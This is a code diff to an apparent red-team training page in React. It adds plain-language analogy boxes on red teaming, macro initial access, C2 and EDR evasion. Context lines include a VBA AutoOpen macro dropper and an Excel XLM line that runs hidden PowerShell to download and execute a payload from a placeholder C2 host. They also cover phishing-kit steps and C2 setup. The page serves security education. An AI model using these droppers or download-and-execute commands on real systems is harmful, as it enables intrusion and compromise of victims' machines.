@@ -2,6 +2,7 @@
 import React from 'react'
 import Link from 'next/link'
 import ModuleCodex, { CodexChapter } from '../../components/ModuleCodex'
+import { Local, Watch, Ref } from '@/app/components/learn/Mtaani'
 
 const accent = '#ff3333'
 const mono = 'JetBrains Mono, monospace'
@@ -69,6 +70,7 @@ const chapters: CodexChapter[] = [
     content: (
       <div>
         <P>Understanding the distinction between these three disciplines is foundational before studying red team techniques. Each operates under different rules, incentives, and objectives. Mixing them up leads to scope creep, legal issues, and meaningless findings.</P>
+        <Local>Imagine a SACCO that hires a team to attempt a full, after-hours break-in &mdash; past the askari, the cameras, the tellers &mdash; purely to see whether anyone notices and how fast they respond. That is a red team: one agreed objective, reach the vault, by any realistic means, in the dark. A penetration test is instead the auditor who walks the building in daylight rattling every padlock and listing the loose ones; a bug bounty is a passer-by paid per loose padlock they happen to report. Same goal of safer money &mdash; very different rules of play.</Local>
         <Table
           headers={['Discipline', 'Duration', 'Objective', 'Stealth', 'Social/Physical', 'Deliverable']}
           rows={[
@@ -78,6 +80,10 @@ const chapters: CodexChapter[] = [
             ['Purple Team', 'Ongoing cycles', 'Improve detection together', 'No', 'Varies', 'Detection rule improvements'],
           ]}
         />
+        <Watch
+          reads={<>The same four disciplines from the table, in plain words. Notice how the focus narrows and the stakes change: a bug bounty hunts single flaws, a pentest lists them all, and a red team cares about one thing &mdash; can the defenders detect and stop a real intruder reaching the crown jewels. Read it to feel the difference in intent, not to memorise terms.</>}
+          later={<>Nothing to run &mdash; this just frames why red team work is planned so differently from the rest.</>}
+        >
         <Pre label="// THE SPECTRUM IN PRACTICE">{`# Bug Bounty
 # Focus: individual CVEs in defined scope
 # Mindset: find it, report it, collect reward
@@ -100,6 +106,7 @@ const chapters: CodexChapter[] = [
 # Red attacks → Blue watches in real time → tune detection rules
 # Collaborative, transparent, iterative
 # Best ROI for mature security programs`}</Pre>
+        </Watch>
         <Note type="warn">Red team engagements require explicit written authorisation covering every TTP you intend to use. Social engineering employees, physical access attempts, and attacking production systems all need separate sign-off. "Get to Domain Admin" is not sufficient scope documentation.</Note>
         <H3>TIBER-EU and Threat-Led Frameworks</H3>
         <P>TIBER-EU (Threat Intelligence-Based Ethical Red Teaming) is the European Central Bank framework for testing financial institutions. It mandates that red teams base their TTPs on actual threat intelligence about actors likely to target the organisation — not generic penetration testing. Similar frameworks: CBEST (UK), iCAST (Hong Kong), AASE (Australia). These are increasingly required for critical infrastructure.</P>
@@ -270,6 +277,10 @@ git clone https://github.com/kgretzky/evilginx2
 # → Attach .docx with macros OR link to credential harvester
 # → A/B test pretexts on small groups before full send`}</Pre>
         <H3>Macro-Based Initial Access</H3>
+        <Watch
+          reads={<>A macro is just a little program tucked inside an Office document. This one wakes up the moment the file is opened, quietly fetches a payload from the attacker&apos;s server and runs it in memory &mdash; nothing saved to disk to find later. You do not need to understand every line; the lesson is why a plain-looking &quot;invoice.docx&quot; from a stranger is dangerous to open.</>}
+          later={<>Read-only for now &mdash; you will build and detonate payloads like this inside the isolated lab, never on a real machine.</>}
+        >
         <Pre label="// VBA MACRO DROPPER">{`' Macro runs when document opens (AutoOpen)
 Sub AutoOpen()
     ' Download and execute payload in memory
@@ -291,6 +302,7 @@ End Sub
 ' Modern alternative: Excel 4.0 (XLM) macros
 ' Harder to detect than VBA, not blocked by default
 ' =EXEC("powershell -nop -w hidden -c IEX(wget http://c2/p.ps1)")`}</Pre>
+        </Watch>
         <H3>Supply Chain & Watering Hole</H3>
         <Pre label="// INDIRECT ACCESS VECTORS">{`# Supply chain attack
 # Step 1: Identify vendors/contractors that access target systems
@@ -336,6 +348,7 @@ End Sub
     content: (
       <div>
         <P>The C2 framework is the red team's nervous system — every implant calls home, every command flows through it, every piece of exfiltrated data passes through it. Building resilient, stealthy C2 infrastructure is as important as the techniques used to deploy implants.</P>
+        <Local>A planted insider who only ever passes notes during the evening matatu rush &mdash; when the stage is packed and noisy &mdash; is almost impossible to pick out. Command-and-control (C2) works the same way: the implant &quot;phones home&quot; in short, infrequent bursts hidden inside ordinary-looking web traffic, so the one signal that matters drowns in the daily crowd. Good C2 is never loud; it is patient and forgettable.</Local>
         <H3>C2 Architecture: The Right Way</H3>
         <Pre label="// PROPER C2 INFRASTRUCTURE">{`# NEVER expose your teamserver directly to the internet
 # Use redirectors — disposable front-end servers that forward traffic
@@ -454,6 +467,7 @@ new-operator --name alice --lhost teamserver.internal
     content: (
       <div>
         <P>Antivirus detects files that match known-bad signatures. EDR (Endpoint Detection and Response) goes further — it instruments the OS kernel, hooks API calls, monitors process behaviour, and sends telemetry to a cloud analysis platform. Evading EDR in 2024 requires understanding exactly what it can and cannot see.</P>
+        <Local>At a busy nyama choma joint, a stranger who quietly picks up an apron and a pair of tongs and starts turning meat is rarely questioned &mdash; he is using the kitchen&apos;s own tools, so everyone assumes he belongs. Attackers dodging EDR do exactly this: rather than smuggle in flashy malware the guard is trained to spot, they &quot;live off the land&quot;, abusing the trusted programs already on the machine so their actions blend into normal day-to-day work.</Local>
         <H3>What EDR Instruments</H3>
         <Table
           headers={['EDR Visibility Point', 'What It Detects', 'Evasion Approach']}
